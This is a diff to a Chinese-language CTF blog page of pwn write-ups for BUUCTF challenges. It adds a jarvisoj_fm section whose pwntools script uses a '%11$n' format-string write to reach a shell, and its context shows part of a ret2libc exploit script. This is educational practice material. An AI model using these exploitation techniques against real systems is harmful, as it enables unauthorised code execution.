@@ -43,8 +43,10 @@
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png">
 <meta property="article:published_time" content="2024-03-25T17:59:06.945Z">
-<meta property="article:modified_time" content="2024-03-31T16:04:23.674Z">
+<meta property="article:modified_time" content="2024-04-07T16:38:26.703Z">
 <meta property="article:author" content="Li1x">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -158,7 +160,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_n_1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D%E6%B3%84%E9%9C%B2ret2libc"><span class="nav-number">1.0.1.</span> <span class="nav-text">-&gt;64位泄露ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">2.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D-ret2libc"><span class="nav-number">2.0.1.</span> <span class="nav-text">-&gt;32位 ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj_level2_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%EF%BC%9A32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E4%BC%A0%E5%8F%82%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.1.</span> <span class="nav-text">学习：32位和64位传参的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">题解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016-%E9%9D%99%E6%80%81-32%E4%BD%8D"><span class="nav-number">5.</span> <span class="nav-text">not_the_same_3dsctf_2016[静态 32位]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-KEEP-ON"><span class="nav-number">7.</span> <span class="nav-text">[HDCTF 2023]KEEP ON</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81%E3%80%81%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">7.1.</span> <span class="nav-text">知识点：格式化字符串劫持、栈迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81-%E5%B0%86printf-got-%E6%94%B9%E6%88%90-system-plt"><span class="nav-number">7.2.</span> <span class="nav-text">法1,格式化字符串劫持(将printf_got 改成 system_plt)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952-%E6%A0%88%E8%BF%81%E7%A7%BB-%E5%8F%AF%E4%BB%A5%E5%85%88%E9%98%85%E8%AF%BB%E5%89%8D%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E7%AB%A0"><span class="nav-number">7.3.</span> <span class="nav-text">法2,栈迁移,可以先阅读前面的那个文章</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-HNCTF-2022-Week1-fmtstrre"><span class="nav-number">8.</span> <span class="nav-text">BUU-[HNCTF 2022 Week1]fmtstrre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">8.1.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">9.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-1"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_n_1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D%E6%B3%84%E9%9C%B2ret2libc"><span class="nav-number">1.0.1.</span> <span class="nav-text">-&gt;64位泄露ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="nav-number">2.</span> <span class="nav-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D-ret2libc"><span class="nav-number">2.0.1.</span> <span class="nav-text">-&gt;32位 ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_n_8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj_level2_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%EF%BC%9A32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E4%BC%A0%E5%8F%82%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">4.1.</span> <span class="nav-text">学习：32位和64位传参的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">题解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#not-the-same-3dsctf-2016-%E9%9D%99%E6%80%81-32%E4%BD%8D"><span class="nav-number">5.</span> <span class="nav-text">not_the_same_3dsctf_2016[静态 32位]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="nav-number">6.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HDCTF-2023-KEEP-ON"><span class="nav-number">7.</span> <span class="nav-text">[HDCTF 2023]KEEP ON</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81%E3%80%81%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">7.1.</span> <span class="nav-text">知识点：格式化字符串劫持、栈迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81-%E5%B0%86printf-got-%E6%94%B9%E6%88%90-system-plt"><span class="nav-number">7.2.</span> <span class="nav-text">法1,格式化字符串劫持(将printf_got 改成 system_plt)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952-%E6%A0%88%E8%BF%81%E7%A7%BB-%E5%8F%AF%E4%BB%A5%E5%85%88%E9%98%85%E8%AF%BB%E5%89%8D%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E7%AB%A0"><span class="nav-number">7.3.</span> <span class="nav-text">法2,栈迁移,可以先阅读前面的那个文章</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-HNCTF-2022-Week1-fmtstrre"><span class="nav-number">8.</span> <span class="nav-text">BUU-[HNCTF 2022 Week1]fmtstrre</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">8.1.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-babyrop"><span class="nav-number">9.</span> <span class="nav-text">[OGeek2019]babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Buu-jarvisoj-fm-fm-n%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">Buu - jarvisoj_fm[ fm %n任意内存写入]</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -173,18 +175,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -247,7 +249,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-04-01 00:04:23" itemprop="dateModified" datetime="2024-04-01T00:04:23+08:00">2024-04-01</time>
+      <time title="Modified: 2024-04-08 00:38:26" itemprop="dateModified" datetime="2024-04-08T00:38:26+08:00">2024-04-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -287,14 +289,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>9.8k</span>
+      <span>10k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>18 mins.</span>
+      <span>19 mins.</span>
     </span>
 </div>
 
@@ -445,6 +447,21 @@
 <p>题目提供了libc文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = offest + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = offest + libc.search(&#x27;bin/sh&#x27;).next()</span></span><br><span class="line">bin_sh_addr = offest + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
+<h2 id="Buu-jarvisoj-fm-fm-n任意内存写入"><a href="#Buu-jarvisoj-fm-fm-n任意内存写入" class="headerlink" title="Buu - jarvisoj_fm[ fm %n任意内存写入]"></a>Buu - jarvisoj_fm[ fm %n任意内存写入]</h2><p>checksec一下 32位，用IDA打开</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-00.png"></p>
+<p><strong>思路：</strong></p>
+<p>要想shell，肯定要满足x&#x3D;&#x3D;4；</p>
+<p>然后又看到有<code>printf(buf)</code> 格式化字符串漏洞标志</p>
+<p>&#x3D;&gt; 通过%n向x地址写入4</p>
+<p><strong>1.确定偏移量</strong></p>
+<p>这是32位程序，第一个参数可以写入AAAA &#x3D; ( 正好占满一个栈的小格子(4字节)的空间 )</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/4-7-01.png"></p>
+<p>-&gt; %08，让长度为8，比较容易好看吧，这个无所谓</p>
+<p>-&gt; %x(打印十六进制数据) 或者 %p(打印栈上数据)均可</p>
+<p>&#x3D;&#x3D;&gt; 偏移量为11</p>
+<p><strong>2.通过<code>%(偏移量)$n</code>来写入值</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if语句中可以调用system(&#x27;bin/sh&#x27;) =&gt; 满足if语句</span></span><br><span class="line"><span class="comment"># 让x=4</span></span><br><span class="line"><span class="comment"># x - addr：0804A02C</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25301</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -504,13 +521,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">48k</span>
+    <span title="Word count total">63k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:28</span>
+    <span title="Reading time total">1:55</span>
   </span>
 </div>
 <div class="busuanzi-count">
